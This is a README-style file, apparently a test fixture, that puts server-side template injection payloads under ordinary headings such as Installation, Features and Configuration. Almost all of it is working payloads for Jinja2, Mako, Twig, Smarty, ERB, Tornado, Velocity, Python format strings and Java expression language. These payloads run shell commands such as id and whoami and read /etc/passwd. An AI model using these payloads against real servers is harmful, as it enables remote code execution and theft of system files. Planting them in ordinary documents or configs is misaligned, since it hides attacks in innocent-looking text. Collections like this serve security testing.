# Malicious SSTI Test Repository

This repository contains {{7*7}} test cases for SSTI vulnerabilities.

## Installation

Run the following command: {{ config.items() }}

## Features

- Feature 1: {{ ''.__class__.__mro__[1].__subclasses__() }}
- Feature 2: {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
- Feature 3: ${7*7}
- Feature 4: <%= 7*7 %>
- Feature 5: ${{7*7}}
- Feature 6: #{7*7}

## Configuration

```python
# Config with Jinja2 SSTI
config = "{{ ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }}"
```

## Usage

```bash
# Mako template injection
<%
import os
os.system('whoami')
%>
```

## Template Expressions

- Jinja2: {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
- Freemarker: ${3*3}
- Velocity: #set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String'))
- Smarty: {php}echo `id`;{/php}
- Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
- ERB: <%= system("whoami") %>
- Tornado: {% import os %}{{ os.popen("whoami").read() }}

## Python Format String Attacks

```python
"{0.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}".format(object())
```

## Additional Payloads

- `{{ ''.__class__.__mro__[2].__subclasses__()[40]()('/etc/passwd').read() }}`
- `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}`
- `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
- `{{ lipsum.__globals__["os"].popen('id').read() }}`
- `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
- `{{ joiner.__init__.__globals__.os.popen('id').read() }}`
- `{{ namespace.__init__.__globals__.os.popen('id').read() }}`

## Expression Language Injection

- `${{7*7}}`
- `${{{7*7}}}`
- `${T(java.lang.Runtime).getRuntime().exec('calc')}`
- `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}`

